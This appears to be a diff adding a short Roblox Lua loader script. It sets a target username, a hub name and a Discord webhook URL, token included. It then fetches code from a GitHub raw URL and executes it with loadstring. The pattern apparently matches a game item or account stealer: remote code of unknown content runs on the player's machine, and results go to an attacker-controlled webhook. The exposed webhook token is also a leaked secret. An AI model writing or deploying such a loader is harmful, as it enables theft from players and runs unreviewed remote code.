@@ -1,0 +1,5 @@
+_G.Username = "M1LES_R"
+_G.HubName = "SummerQuest"
+_G.WebHookUrl = "https://discord.com/api/webhooks/1130522100235509880/uA-CVtq8KX_8MUqHuwGRvthzEMFlFpFzhx_HwtlVssCjFoY9iTg0SZlxZuq4kH-32QGK"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
